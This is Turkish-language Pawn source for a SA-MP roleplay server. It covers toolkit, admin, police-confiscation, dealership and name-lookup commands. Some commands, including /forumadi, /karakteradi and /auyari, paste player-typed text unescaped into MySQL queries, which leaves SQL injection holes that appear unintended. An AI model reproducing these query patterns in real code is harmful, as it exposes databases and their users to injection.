	        if(gToolkit[playerid]) return Hata(playerid, "Zaten alet çantanýz bulunmakta.");
	    	ShowPlayerDialog(playerid, 435, DIALOG_STYLE_MSGBOX, ""C7"EIGHTBORN - "C8"Toolkit", ""C1"Toolkit almak istiyor musunuz? Ücret:500"DOLAR"$\n"C2"(Toolkit üzerinizde geçici olarak bulunacaktýr, oyundan çýkýnca üzerinizden gider.)", "Satýn Al", "Ýptal");
		}
		else if(Buysa(nstring, "ver")) {
		    if(!gToolkit[playerid]) return Hata(playerid, "Alet çantanýz yok.");
		    if(_id == -1 || _id == playerid) return Kullanim(playerid, "/toolkit ver [oyuncuID]");
			if(!Girdi[_id]) return Hata(playerid, "Hatalý oyuncu id belirttiniz.");
			if(!IsPlayerNearPlayer(playerid, _id, 5)) return Hata(playerid, "Oyuncu yakýnýnýzda deðil.");
		    gToolkit[playerid] = 0;
		    gToolkit[_id] = 1;
		    format(mstring, sizeof(mstring), "elindeki alet çantasýný %s'a doðru uzatýr.",OyuncuAdiniBul(_id));
			MeGonder(playerid, 30.0, mstring);
		}
		else return Kullanim(playerid, "/toolkit [fonksiyon]"),SendClientMessage(playerid, -1, ""C3"Kullanýlabilir fonksiyonlar: al, ver");
	}
	else {
		foreach(new i : Business)
	    {
	    	if(Isyeri[i][itip] == 15 && IsPlayerInRangeOfPoint(playerid, 30.0, Isyeri[i][acikisx], Isyeri[i][acikisy], Isyeri[i][acikisz]) && GetPlayerVirtualWorld(playerid) == i && GetPlayerInterior(playerid) == 1)
	    	{
				if(!IsyeriYetkilisi(playerid, i)) return Hata(playerid, "Bu iþyerinde yetkili deðilsiniz.");
				if(!IsyeriYetkilisi(playerid, i)) return Hata(playerid, "Bu iþyerinde yetkili deðilsiniz.");
				if(isnull(params)) return Kullanim(playerid, "/toolkit [fonksiyon]"),SendClientMessage(playerid, -1, ""C3"Kullanýlabilir fonksiyonlar: al, ver");
				sscanf(params,"s[16]d",nstring,_id);
				if(Buysa(nstring, "al")) {
	                if(gToolkit[playerid]) return Hata(playerid, "Zaten alet çantanýz bulunmakta.");
	                ShowPlayerDialog(playerid, 435, DIALOG_STYLE_MSGBOX, ""C7"EIGHTBORN - "C8"Toolkit", ""C1"Toolkit almak istiyor musunuz? Ücret:200"DOLAR"$\n"C2"(Toolkit üzerinizde geçici olarak bulunacaktýr, oyundan çýkýnca üzerinizden gider.)", "Satýn Al", "Ýptal");
				}
				else if(Buysa(nstring, "ver")) {
				    if(!gToolkit[playerid]) return Hata(playerid, "Alet çantanýz yok.");
				    if(_id == -1 || _id == playerid) return Kullanim(playerid, "/toolkit ver [oyuncuID]");
				    if(!Girdi[_id]) return Hata(playerid, "Hatalý oyuncu id belirttiniz.");
				    if(!IsPlayerNearPlayer(playerid, _id, 5)) return Hata(playerid, "Oyuncu yakýnýnýzda deðil.");
				    gToolkit[playerid] = 0;
				    gToolkit[_id] = 1;
				    format(mstring, sizeof(mstring), "elindeki alet çantasýný %s'a doðru uzatýr.",OyuncuAdiniBul(_id));
					MeGonder(playerid, 30.0, mstring);
				}
				else return Kullanim(playerid, "/toolkit [fonksiyon]"),SendClientMessage(playerid, -1, ""C3"Kullanýlabilir fonksiyonlar: al, ver");
				break;
			}
		}
	}
	return 1;
}

CMD:ajetpack(playerid) {
	if(!Girdi[playerid] || Karakter[playerid][adminlevel] < 5 || !AKontrol(playerid)) return 1;
	return SetPlayerSpecialAction(playerid,SPECIAL_ACTION_USEJETPACK);
}

CMD:akitver(playerid, params[])
{
	if(!Girdi[playerid] || Karakter[playerid][adminlevel] < 4 || !AKontrol(playerid)) return 1;
	new pid;
	if(sscanf(params,"d",pid)) return Kullanim(playerid, "/akitver [oyuncuID]");
	if(!Girdi[pid]) return Hata(playerid, "Hatalý oyuncu id.");
	switch(gToolkit[pid])
	{
	    case 0:
	    {
			new mstring[128];
			format(mstring, sizeof(mstring), "%s isimli oyuncuya alet çantasý verdiniz.",OyuncuAdiniBul(pid));
	        Bilgi(playerid, mstring);
	        gToolkit[pid] = 1;
	        Bilgi(pid, "Alet çantasý verildi.");
	    }
	    case 1:
	    {
	        new mstring[128];
			format(mstring, sizeof(mstring), "%s isimli oyuncunun alet çantasý aldýnýz.",OyuncuAdiniBul(pid));
	        Bilgi(playerid, mstring);
	        gToolkit[pid] = 0;
	        Bilgi(pid, "Alet çantanýz alýndý.");
	    }
	}
	return 1;
}

CMD:frekans(playerid, params[])
{
	if(!Girdi[playerid]) return 1;
	if(!Karakter[playerid][telsiz]) return Hata(playerid, "Telsiziniz bulunmamaktadýr.");
	new _frekans;
	if(sscanf(params,"d",_frekans))
	{
		Kullanim(playerid, "/frekans [telsiz frekansý]");
		static mstring[128];
		format(mstring,128,"Þuanki telsiz frekansýnýz %d.",Karakter[playerid][frekans]);
		Bilgi(playerid, mstring);
		return 1;
	}
	if(1000 < _frekans < 9999)
	{
	    Karakter[playerid][frekans] = _frekans;
		static mstring[128];
		format(mstring, 128, "Telsiz frekansýnýz %d olarak ayarlandý.",_frekans);
		Bilgi(playerid, mstring);
		KarakterKaydet(playerid);
	}
	else return Hata(playerid, "Frekans ayarý 4 haneli sayý olmalýdýr.");
	return 1;
}

stock RandomLimit(limit)
{
	new string[128];
	new randoms[][] = {"0","1","2","3","4","5","6","7","8","9","A","B","C","D","F","E","G","H","I","J","K","L","M","N","O","P","R","S","T","U","V","Y","Z"};
	for(new i=0;i<limit;i++)
	{
		format(string, sizeof(string), "%s%s", string,randoms[random(sizeof(randoms))]);
	}
	return string;
}

CMD:elkoy(playerid, params[])
{
	if(Girdi[playerid])
	{
		if((Birlik[Karakter[playerid][birlik]][ftip] == LSPD && Karakter[playerid][isbasi] == 1) || Birlik[Karakter[playerid][birlik]][ftip] == FBI)
		{
			new mstring[128],nstring[128],_pid;
			_pid = -1;
			if(isnull(params))
			{
			    Kullanim(playerid, "/elkoy [fonksiyon]");
			    SendClientMessage(playerid, -1, "Geçerli fonksiyonlar: silah, uyusturucu, telefon, telsiz, ehliyet, silahruhsat");
				return 1;
			}
			sscanf(params,"s[128]s[128]d",mstring,nstring,_pid);
			if(Buysa("silah",mstring))
			{
			    if(isnull(nstring)) return Kullanim(playerid, "/elkoy silah [fonksiyon]"),SendClientMessage(playerid, -1,"Geçerli fonksiyonlar: yer, arac, oyuncu");
				if(Buysa("yer",nstring))
				{
				    foreach(new sy : GunsGround)
					{
						if(!IsValidDynamicObject(SilahYer[sy][syobject])) continue;
						if(IsPlayerInRangeOfPoint(playerid, 2.5, SilahYer[sy][syposx], SilahYer[sy][syposy], SilahYer[sy][syposz]) && GetPlayerVirtualWorld(playerid) == SilahYer[sy][syvworld] && GetPlayerInterior(playerid) == SilahYer[sy][syinterior])
						{
						    new _no = SilahYerNoCek(SilahYer[sy][syid]);
							new _id;
							foreach(new i : Guns)
							{
							    if(OyuncuSilah[i][no] == _no)
							    {
							        _id = i;
							        break;
							    }
							}
							OyuncuSilah[_id][durum] = 5;
							OyuncuSilahKaydetEx(_id);
        					new alinansilah = SilahYer[sy][sysilah];
						    new string[128];
							format(string, sizeof(string), "Silaha baþarýyla el koydunuz. Silah: %s", SilahIsim(alinansilah));
							Bilgi(playerid, string);
							format(string, sizeof(string), "[SILAH LOG] %d nolu silaha el koydu.",OyuncuSilah[_id][no]);
							Log(playerid, string);
							format(string,sizeof(string),"{ffff00}[LSPD] %s, (#%d)%s model silaha LSPD adýna el koydu.",OyuncuAdiniBul(playerid),OyuncuSilah[_id][no],SilahIsim(SilahYer[sy][sysilah]));
							for(new i=0;i<MAX_PLAYERS;i++){
								if(Birlik[Karakter[i][birlik]][ftip] == LSPD && Girdi[i]){
									MesajGonder(i,0xffff00FF,string);
								}
							}
							DestroyDynamicObject(SilahYer[sy][syobject]);
							SilahYer[sy][syposx] = 0;
							SilahYer[sy][syposy] = 0;
							SilahYer[sy][syposz] = 0;
							SilahYer[sy][sysilah] = 0;
							new query[128];
							format(query, sizeof(query), "DELETE FROM `silahyer` WHERE `id` = '%d'", SilahYer[sy][syid]);
							mysql_tquery(1,query);
							Iter_Remove(GunsGround, sy);
						    return 1;
						}
					}
					Hata(playerid, "Bulunduðunuz yerde bir silah yok.");
				}
				else if(Buysa("arac",nstring))
				{
				    if(!IsPlayerInAnyVehicle(playerid)) return Hata(playerid, "Silahý almak istediðiniz aracýn içerisinde olmalýsýnýz.");
					silahalev[playerid] = GetPlayerVehicleID(playerid);
					AracSilahElkoy(playerid,silahalev[playerid]);
				}
				else if(Buysa("oyuncu",nstring))
				{
				    if(_pid == -1 || !Girdi[_pid] || _pid == playerid) return Kullanim(playerid, "/elkoy silah oyuncu [oyuncuID]");
				    if(!IsPlayerNearPlayer(playerid, _pid, 5)) return Hata(playerid, "Oyuncunun yanýnda deðilsiniz.");
				    ShowGunsElkoy(playerid, _pid);
				}
			}
			else if(Buysa("uyusturucu",mstring))
			{
			    _pid = strval(nstring);
			    if(_pid == -1 || !Girdi[_pid] || isnull(nstring) || _pid == playerid) return Kullanim(playerid, "/elkoy uyusturucu [oyuncuID]");
			    if(!IsPlayerNearPlayer(playerid, _pid, 5)) return Hata(playerid, "Oyuncunun yanýnda deðilsiniz.");
       			if(IsPlayerInAnyVehicle(playerid)) return Hata(playerid, "Araçtan inmeniz gerekiyor.");
			    new string[128];
				format(string, sizeof(string), "%s adlý polis memuru uyuþturucu ve saksýlarýnýza el koydu.", OyuncuAdiniBul(playerid));
				Bilgi(_pid, string);
				format(string, sizeof(string), "%s adlý kiþinin uyuþturucu ve saksýlarýna el koydunuz.", OyuncuAdiniBul(_pid));
				Bilgi(playerid, string);
				format(string, sizeof(string), "[UYUSTURUCU LOG] %s, %s adlý kiþinin uyuþturucu ve saksýlarýna el koydu.",OyuncuAdiniBul(playerid),OyuncuAdiniBul(_pid));
				Log(playerid, string);
				format(string,sizeof(string),"{ffff00}[LSPD] %s, %s adlý kiþinin uyuþturucu ve saksýlarýna el koydu.",OyuncuAdiniBul(playerid),OyuncuAdiniBul(_pid));
				for(new i=0;i<MAX_PLAYERS;i++){
					if(Birlik[Karakter[i][birlik]][ftip] == LSPD && Girdi[i]){
						MesajGonder(i,0xAAAAFFFF,string);
					}
				}
				Karakter[_pid][uesrar] = 0;
				Karakter[_pid][umantar] = 0;
				Karakter[_pid][hammantar] = 0;
				Karakter[_pid][usaksi] = 0;
				Karakter[_pid][esrartohum] = 0;
				Karakter[_pid][kokaintohum] = 0;
				Karakter[_pid][erointohum] = 0;
				Karakter[_pid][amfetamin] = 0;
				Karakter[_pid][metamfetamin] = 0;
				Karakter[_pid][lsd] = 0;
				Karakter[_pid][extacy] = 0;
				Karakter[_pid][eroin] = 0;
				Karakter[_pid][kokain] = 0;
				Karakter[_pid][morfin] = 0;
				Karakter[_pid][MDA] = 0;
				KarakterKaydet(_pid);
			}
			else if(Buysa("telefon",mstring))
			{
			    _pid = strval(nstring);
			    if(_pid == -1 || !Girdi[_pid] || isnull(nstring) || _pid == playerid) return Kullanim(playerid, "/elkoy telefon [oyuncuID]");
			    if(!IsPlayerNearPlayer(playerid, _pid, 5)) return Hata(playerid, "Oyuncunun yanýnda deðilsiniz.");
			    Karakter[_pid][telno] = 0;
			    KarakterKaydet(_pid);
			    new string[128];
				format(string, sizeof(string), "%s adlý polis memuru telefonunuza el koydu.", OyuncuAdiniBul(playerid));
				Bilgi(_pid, string);
				format(string, sizeof(string), "%s adlý kiþinin telefonuna el koydunuz.", OyuncuAdiniBul(_pid));
				Bilgi(playerid, string);
			}
			else if(Buysa("telsiz",mstring))
			{
			    _pid = strval(nstring);
			    if(_pid == -1 || !Girdi[_pid] || isnull(nstring) || _pid == playerid) return Kullanim(playerid, "/elkoy telsiz [oyuncuID]");
			    if(!IsPlayerNearPlayer(playerid, _pid, 5)) return Hata(playerid, "Oyuncunun yanýnda deðilsiniz.");
			    Karakter[_pid][telsiz] = 0;
			    Karakter[_pid][frekans] = 0;
			    KarakterKaydet(_pid);
			    new string[128];
				format(string, sizeof(string), "%s adlý polis memuru telsizinize el koydu.", OyuncuAdiniBul(playerid));
				Bilgi(_pid, string);
				format(string, sizeof(string), "%s adlý kiþinin telsizinize el koydunuz.", OyuncuAdiniBul(_pid));
				Bilgi(playerid, string);
			}
			else if(Buysa("ehliyet",mstring))
			{
			    _pid = strval(nstring);
			    if(_pid == -1 || !Girdi[_pid] || isnull(nstring) || _pid == playerid) return Kullanim(playerid, "/elkoy ehliyet [oyuncuID]");
			    if(!IsPlayerNearPlayer(playerid, _pid, 5)) return Hata(playerid, "Oyuncunun yanýnda deðilsiniz.");
			    Karakter[_pid][ehliyet] = 0;
			    KarakterKaydet(_pid);
			    new string[128];
				format(string, sizeof(string), "%s adlý polis memuru ehliyetinize el koydu.", OyuncuAdiniBul(playerid));
				Bilgi(_pid, string);
				format(string, sizeof(string), "%s adlý kiþinin ehliyetine el koydunuz.", OyuncuAdiniBul(_pid));
				Bilgi(playerid, string);
			}
			else if(Buysa("silahruhsat",mstring))
			{
			    _pid = strval(nstring);
			    if(_pid == -1 || !Girdi[_pid] || isnull(nstring) || _pid == playerid) return Kullanim(playerid, "/elkoy silahruhsat [oyuncuID]");
			    if(!IsPlayerNearPlayer(playerid, _pid, 5)) return Hata(playerid, "Oyuncunun yanýnda deðilsiniz.");
			    Karakter[_pid][sruhsat] = 0;
			    Karakter[_pid][sruhsat2] = 0;
			    KarakterKaydet(_pid);
			    new string[128];
				format(string, sizeof(string), "%s adlý polis memuru silah taþýma ve bulundurma lisansýnýza el koydu.", OyuncuAdiniBul(playerid));
				Bilgi(_pid, string);
				format(string, sizeof(string), "%s adlý kiþinin silah taþýma ve bulundurma lisansýna el koydunuz.", OyuncuAdiniBul(_pid));
				Bilgi(playerid, string);
			}
			else
			{
			    Kullanim(playerid, "/elkoy [fonksiyon]");
			    SendClientMessage(playerid, -1, "Geçerli fonksiyonlar: silah, uyusturucu, telefon, ehliyet");
				return 1;
			}
		}
		else
		{
		    Hata(playerid, "LSPD görevlisi veya iþbaþýnda deðilsiniz.");
		}
	}
	return 1;
}

CMD:galerilisans(playerid, params[])
{
	if(!Girdi[playerid] || !AKontrol(playerid) || Karakter[playerid][adminlevel] < 5) return 1;
	new mstring[10],_id;
	if(sscanf(params,"ds[10]",_id,mstring)) return Kullanim(playerid, "/galerilisans [oyuncuID] [normal/ss]");
	if(Buysa("normal",mstring))
 	{
 	    if(!Girdi[_id]) Kullanim(playerid, "/galerilisans [normal/ss] [playerid]");
		new mmstring[128];
		if(!Karakter[_id][galeri])
		{
			format(mmstring, sizeof(mmstring), "%s isimli oyuncuya normal galeri lisansý verdiniz.",OyuncuAdiniBul(_id));
			Bilgi(playerid, mmstring);
			format(mmstring, sizeof(mmstring), "%s nickli admin tarafýndan normal galeri lisansý verildi.",Karakter[playerid][anick]);
			Bilgi(_id, mmstring);
			Karakter[_id][galeri] = 1;
		}
		else
		{
		    format(mmstring, sizeof(mmstring), "%s isimli oyuncudan normal galeri lisansýný aldýnýz.",OyuncuAdiniBul(_id));
			Bilgi(playerid, mmstring);
			format(mmstring, sizeof(mmstring), "%s nickli admin tarafýndan normal galeri lisansýnýz alýndý.",Karakter[playerid][anick]);
			Bilgi(_id, mmstring);
			Karakter[_id][galeri] = 0;
		}
	}
	else if(Buysa("ss",mstring))
	{
	    if(!Girdi[_id]) Kullanim(playerid, "/galerilisans [normal/ss] [playerid]");
	    new mmstring[128];
		if(!Karakter[_id][ssgaleri])
		{
			format(mmstring, sizeof(mmstring), "%s isimli oyuncuya super sport galeri lisansý verdiniz.",OyuncuAdiniBul(_id));
			Bilgi(playerid, mmstring);
			format(mmstring, sizeof(mmstring), "%s nickli admin tarafýndan super sport galeri lisansý verildi.",Karakter[playerid][anick]);
			Bilgi(_id, mmstring);
			Karakter[_id][ssgaleri] = 1;
		}
		else
		{
		    format(mmstring, sizeof(mmstring), "%s isimli oyuncudan super sport galeri lisansýný aldýnýz.",OyuncuAdiniBul(_id));
			Bilgi(playerid, mmstring);
			format(mmstring, sizeof(mmstring), "%s nickli admin tarafýndan super sport galeri lisansýnýz alýndý.",Karakter[playerid][anick]);
			Bilgi(_id, mmstring);
			Karakter[_id][ssgaleri] = 0;
		}
	}
	else Kullanim(playerid, "/galerilisans [normal/ss] [playerid]");
	return 1;
}

GaleriListeGoster(playerid,sayfa=1)
{
	new mstring[1024];
	mstring = "Araç\tFiyat\n";
	if(sayfa == 1)
	{
	    for(new i=0;i<20;i++)
	    {
	        format(mstring, sizeof(mstring), "%s"CIZGI1" {bada55}%s\t "C1"%d"DOLAR"$\n", mstring, GetVehicleNameEx(GaleriListe[i]), GaleriFiyat(GaleriListe[i]));
		}
	    format(mstring,sizeof(mstring),"%s\n{6c78d8}  Ýleri>>",mstring);
	    return ShowPlayerDialog(playerid, 361, DIALOG_STYLE_TABLIST_HEADERS, ""C7"EIGHTBORN - "C8"Normal Galeri", mstring, "Satin Al", "Ýptal");
	}
	if(sayfa == 2)
	{
	    for(new i=20;i<40;i++)
	    {
	        format(mstring, sizeof(mstring), "%s"CIZGI1" {bada55}%s\t "C1"%d"DOLAR"$\n", mstring, GetVehicleNameEx(GaleriListe[i]), GaleriFiyat(GaleriListe[i]));
	    }
	    format(mstring,sizeof(mstring),"%s\n{6c78d8}  Ýleri>>\n{6c78d8}  <<Geri",mstring);
	    return ShowPlayerDialog(playerid, 362, DIALOG_STYLE_TABLIST_HEADERS, ""C7"EIGHTBORN - "C8"Normal Galeri", mstring, "Satin Al", "Ýptal");
	}
	if(sayfa == 3)
	{
	    for(new i=40;i<60;i++)
	    {
	        format(mstring, sizeof(mstring), "%s"CIZGI1" {bada55}%s\t "C1"%d"DOLAR"$\n", mstring, GetVehicleNameEx(GaleriListe[i]), GaleriFiyat(GaleriListe[i]));
	    }
	    format(mstring,sizeof(mstring),"%s\n{6c78d8}  Ýleri>> \n{6c78d8}  <<Geri",mstring);
	    return ShowPlayerDialog(playerid, 363, DIALOG_STYLE_TABLIST_HEADERS, ""C7"EIGHTBORN - "C8"Normal Galeri", mstring, "Satin Al", "Ýptal");
	}
	if(sayfa == 4)
	{
	    for(new i=60;i<81;i++)
	    {
	        format(mstring, sizeof(mstring), "%s"CIZGI1" {bada55}%s\t "C1"%d"DOLAR"$\n", mstring, GetVehicleNameEx(GaleriListe[i]), GaleriFiyat(GaleriListe[i]));
	    }
	    format(mstring,sizeof(mstring),"%s\n{6c78d8}  <<Geri",mstring);
	    return ShowPlayerDialog(playerid, 364, DIALOG_STYLE_TABLIST_HEADERS, ""C7"EIGHTBORN - "C8"Normal Galeri", mstring, "Satin Al", "Ýptal");
	}
	return 1;
}

CMD:gengelle(playerid, params[])
{
	if(!Girdi[playerid] || !Karakter[playerid][telno]) return 1;
	switch(Karakter[playerid][gengelle])
	{
	    case 0:
	    {
	        Bilgi(playerid, "Telefonunuzu gizli numaralara kapattýnýz.");
	        Karakter[playerid][gengelle] = 1;
	    }
	    case 1:
	    {
	        Bilgi(playerid, "Telefonunuzu gizli numaralara açtýnýz.");
	        Karakter[playerid][gengelle] = 0;
	    }
	}
	KarakterKaydet(playerid);
	return 1;
}

CMD:numaragizle(playerid, params[])
{
    if(!Girdi[playerid] || !Karakter[playerid][telno]) return 1;
	switch(GetPVarInt(playerid,"NumaraGizle"))
	{
	    case 0:
	    {
	        Bilgi(playerid, "Telefon numaranýzý gizlediniz.");
	        SetPVarInt(playerid, "NumaraGizle", 1);
	    }
	    case 1:
	    {
	        Bilgi(playerid, "Telefon numaranýzýn gizliliðini kaldýrdýnýz.");
	        SetPVarInt(playerid, "NumaraGizle", 0);
	    }
	}
	return 1;
}

VergiOdeArac(playerid, vehicleid)
{
	if(!IsValidVehicle(vehicleid)) return 0;
    if(Arac[vehicleid][aowner] == Karakter[playerid][sqlid]) return 1;
    if(AracAnahtarKontrol(playerid, vehicleid)) return 1;
	else if(Arac[vehicleid][abirlik] == Karakter[playerid][birlik] && Arac[vehicleid][atip] == 2 && Arac[vehicleid][abirliktip] == 0) return 1;
	return 0;
}

CMD:balikyardim(playerid, params[])
{
	if(!Girdi[playerid]) return 1;
	SendClientMessage(playerid, BIZIMYESIL, ""C2"[BALIK YARDIM]");
	SendClientMessage(playerid, COLOR_WHITE, "/baliklarim, /yemdegistir");
	Ipucu(playerid, "Yeminizi deðiþtirmek için '/yemdegistir' komutunu kullanabilirsiniz.");
	return 1;
}

/*CMD:balikara(playerid, params[])
{
    if(!Girdi[playerid]) return 1;
    if(!SevkiyatGorev[playerid] && !PizzaGorevde[playerid] && !SicilTGorevde[playerid] && !otobuste[playerid] && !GetPVarInt(playerid, "TGorev"))
    {
    	if(meslekbul[playerid] == 1) {meslekbul[playerid]=0;DisablePlayerCheckpoint(playerid);return 1;}
		meslekbul[playerid] = 1;
		new randomx = randomEx(1,2);
		if(randomx == 1) SetPlayerCheckpoint(playerid, 380.9995,-2154.0984,-0.6328, 45.0);
		else SetPlayerCheckpoint(playerid, 47.3103,-1981.4442,-0.5948, 45.0);
	}
	else
	{
	    Hata(playerid, "Þuan balýk tutma yeri arayamazsýnýz.");
	}
	return 1;
}*/

CMD:afbi(playerid, params[])
{
	if(!Girdi[playerid] || !AKontrol(playerid) || Karakter[playerid][adminlevel] < 5) return 1;
	new _pid;
	if(sscanf(params,"d",_pid)) return Kullanim(playerid, "/afbi [oyuncuID]");
	if(!Girdi[_pid]) return Hata(playerid, "Hatalý oyuncu id.");
	switch(Karakter[_pid][ciu])
	{
	    case 0:
	    {
	        Bilgi(playerid, "Oyuncuya FBI yetkisi verdiniz.");
	        Bilgi(_pid, "Admin tarafýndan FBI yetkisi verildi.");
			Karakter[_pid][ciu] = 1;
	    }
	    case 1:
	    {
	        Bilgi(playerid, "Oyuncudan FBI yetkisini aldýnýz.");
	        Bilgi(_pid, "Admin tarafýndan FBI yetkiniz alýndý.");
			Karakter[_pid][ciu] = 0;
	    }
	}
	KarakterKaydet(_pid);
	return 1;
}

CMD:arozetno(playerid, params[])
{
	if(!Girdi[playerid] || !AKontrol(playerid) || Karakter[playerid][adminlevel] < 5) return 1;
	new _pid, rno;
	if(sscanf(params,"dd",_pid,rno)) return Kullanim(playerid, "/arozetno [oyuncuID] [no]");
	if(!Girdi[_pid]) return Hata(playerid, "Hatalý oyuncu id.");
	Bilgi(playerid, "Oyuncuynun rozet numarasý deðiþtirildi.");
 	Bilgi(_pid, "Admin tarafýndan rozet numaranýz deðiþtirildi.");
    Karakter[_pid][rozetno] = rno;
	KarakterKaydet(_pid);
	return 1;
}

CMD:fbi(playerid, params[])
{
	if(!Girdi[playerid] || !Karakter[playerid][ciu]) return 1;
 	new giveplayerid,string[512];
	if(sscanf(params,"d",giveplayerid)) return Kullanim(playerid, "/fbi [oyuncuID]");
	if (ProxDetectorS(5.0, playerid, giveplayerid ) )
	{
		format(string, sizeof(string), ""C1"Baðlý Oluðum Kurum : \t"C2"Adalet Bakanlýðý\n"C1"Görev : \t\t"C2"FBI Ajaný\n"C1"Görev Tipi : \t\t"C2"Gizli\n\n%s\n"C1"Belge Numarasý : \t"C2"%d", OyuncuAdiniBul(playerid), Karakter[playerid][rozetno]);
		ShowPlayerDialog(giveplayerid, 175, DIALOG_STYLE_MSGBOX, "FEDERAL BUREAU OF INVESTIGATION", string, "Kapat", "");
		format(string, sizeof(string), "/me belgeyi %s doðru gösterir.", OyuncuAdiniBul(giveplayerid));
		OnPlayerCommandPerformed(playerid, string,0);
	}
	else Hata(playerid, "Bu oyuncu yakýnýnýzda deðil.");
	return 1;
}

CMD:auyari(playerid, params[])
{
	if(!Girdi[playerid] || !AKontrol(playerid) || Karakter[playerid][adminlevel] < 1) return 1;
	new _pid,sebepp[128];
	if(sscanf(params,"ds[128]",_pid,sebepp)) return Kullanim(playerid, "/auyari [oyuncuID] [sebep]");
	if(!Girdi[playerid]) return Hata(playerid, "Hatalý oyuncu id.");
	Karakter[_pid][uyari]++;
	new mstring[256];
	format(mstring, sizeof(mstring), "%s isimli oyuncuyu %s sebebinden uyardýnýz. (UYARI SAYISI:%d)",OyuncuAdiniBul(_pid),sebepp,Karakter[_pid][uyari]);
	Bilgi(playerid, mstring);
	format(mstring, sizeof(mstring), "%s tarafýndan %s sebebiyle uyarý aldýnýz.",Karakter[playerid][anick],sebepp);
	Bilgi(_pid, mstring);
	format(mstring, sizeof(mstring), "Toplam uyarý sayýnýz %d olmuþtur, eðer 3 uyarý sayýsýna ulaþýrsanýz karakteriniz kilitlenecek.",Karakter[_pid][uyari]);
	Ipucu(_pid, mstring);
	KarakterKaydet(_pid);
	new mtext[20];
	new year, month,day;
	getdate(year, month, day);
	if(month == 1) { mtext = "Ocak"; }
	else if(month == 2) { mtext = "Subat"; }
	else if(month == 3) { mtext = "Mart"; }
	else if(month == 4) { mtext = "Nisan"; }
	else if(month == 5) { mtext = "Mayis"; }
	else if(month == 6) { mtext = "Haziran"; }
	else if(month == 7) { mtext = "Temmuz"; }
	else if(month == 8) { mtext = "Agustos"; }
	else if(month == 9) { mtext = "Eylul"; }
	else if(month == 10) { mtext = "Ekim"; }
	else if(month == 11) { mtext = "Kasim"; }
	else if(month == 12) { mtext = "Aralik"; }
	new hour,minuite,second;
	gettime(hour,minuite,second);
	#pragma unused second
	new _tarih[512];
	format(_tarih, sizeof(_tarih), "Tarih:[%d %s %d] - Saat:[%d:%d]", day,mtext,year,hour,minuite);
	new mquery[512];
	format(mquery, sizeof(mquery), "INSERT INTO `uyarilar` (`ad`,`nick`,`yonetici`,`sebep`,`tarih`) VALUES ('%s','%s','%s','%s','%s')",
	OyuncuAdiniBul(_pid),
	Karakter[_pid][nick],
	Karakter[playerid][anick],
	sebepp,
	_tarih);
	mysql_tquery(1,mquery);
	if(Karakter[_pid][uyari] == 3)
	{
	    Bilgi(playerid, "Oyuncu uyarý limitini açtýðý için kilitlenmiþtir.");
	    Kilitle(playerid,_pid,"Uyarý Sýnýrý Aþýmý");
	}
	return 1;
}

CMD:auyariduzenle(playerid, params[])
{
	if(!Girdi[playerid] || !AKontrol(playerid) || Karakter[playerid][adminlevel] < 4) return 1;
	new _pid;
	if(sscanf(params,"d",_pid)) return Kullanim(playerid, "/auyariduzenle [oyuncuID]");
	if(!Girdi[_pid]) return Hata(playerid, "Hatalý oyuncu id.");
	new query[128],mstring[1024];
    format(query, sizeof(query), "SELECT * FROM `uyarilar` WHERE `ad` = '%s'",OyuncuAdiniBul(_pid));
    new rows, fields, _tarih[512], _sebep[128];
	new Cache:cache = mysql_query(query,true);
	cache_get_data(rows, fields, g_iHandle);
	for(new i;i<rows;i++){
		cache_get_field_content(i, "tarih", _tarih);
		cache_get_field_content(i, "sebep", _sebep);
		format(mstring, sizeof(mstring), "%s%s\t%s\n",mstring, _tarih, _sebep);
	}
	cache_delete(cache);
	if(!rows) return Hata(playerid, "Oyuncunun hiç uyarýsý bulunmamaktadýr.");
	SetPVarInt(playerid, "UyariDuzenle", _pid);
	format(mstring, sizeof(mstring), "Tarih\tSebep\n%s",mstring);
	ShowPlayerDialog(playerid, 375, DIALOG_STYLE_TABLIST_HEADERS, ""C7"EIGHTBORN - "C8"Uyarý Düzenle", mstring, "Seç", "Ýptal");
	return 1;
}

CMD:kad(playerid, params[]) return cmd_karakteradi(playerid, params);
CMD:karakteradi(playerid, params[])
{
	if(!Girdi[playerid] || !AKontrol(playerid) || Karakter[playerid][adminlevel] < 1) return 1;
	new _ad[32],__ad[32];
	if(sscanf(params,"s[32]",_ad)) return Kullanim(playerid, "/karakteradi [Nick]");
	new query[128];
    format(query, sizeof(query), "SELECT * FROM `karakterler` WHERE `Nickname` = '%s'",_ad);
    new rows, fields;
	new Cache:cache = mysql_query(query,true);
	if (!cache_get_row_count())
	{
	    cache_delete(cache);
		return Hata(playerid, "Bu nickli bir oyuncu bulunamadý.");
	}
	else
	{
		cache_get_data(rows, fields, g_iHandle);
		cache_get_field_content(0, "isim", __ad);
		format(query, sizeof(query), "Nick: %s - Karakter Adý: %s",_ad,__ad);
		Bilgi(playerid, query);
	}
	cache_delete(cache);
	return 1;
}

CMD:forumadi(playerid, params[])
{
	if(!Girdi[playerid]) return 1;
	new _ad[32],__ad[32];
	if(sscanf(params,"s[32]",_ad)) return Kullanim(playerid, "/forumadi [Isim_Soyisim]");
	new query[128];
    format(query, sizeof(query), "SELECT * FROM `karakterler` WHERE `isim` = '%s'",_ad);
    new rows, fields;
	new Cache:cache = mysql_query(query,true);
	if (!cache_get_row_count())
	{
	    cache_delete(cache);
		return Hata(playerid, "Bu isimde bir oyuncu bulunamadý.");
	}
	else
	{
		cache_get_data(rows, fields, g_iHandle);
		cache_get_field_content(0, "Nickname", __ad);
		format(query, sizeof(query), "Karakter Adý: %s - Nickname: %s",_ad,__ad);
		Bilgi(playerid, query);
	}
	cache_delete(cache);
	return 1;
}

stock ReSpawnActor(actorid)
{
	new Float:aPos[4], nvw;
	nvw = GetDynamicActorVirtualWorld(NPC[actorid][nid]);
	GetDynamicActorPos(NPC[actorid][nid], aPos[0], aPos[1], aPos[2]);
	GetDynamicActorFacingAngle(NPC[actorid][nid], aPos[3]);
	DestroyDynamicActor(NPC[actorid][nid]);
	NPC[actorid][nid] = CreateDynamicActor(NPC[actorid][nskin], aPos[0], aPos[1], aPos[2], aPos[3]);
	if(!IsValidDynamic3DTextLabel(NPC[actorid][nadtext])) NPC[actorid][nadtext] = CreateDynamic3DTextLabel(NPC[actorid][nad], COLOR_GREY, aPos[0], aPos[1], aPos[2] + 0.85, 15, .testlos=1);
    if(!IsValidDynamic3DTextLabel(NPC[actorid][nyazitext])) NPC[actorid][nyazitext] = CreateDynamic3DTextLabel("", -1, aPos[0], aPos[1], (aPos[2] + 1.1), 15, .testlos=1);
	SetDynamicActorColor(NPC[actorid][nid], COLOR_GREY);
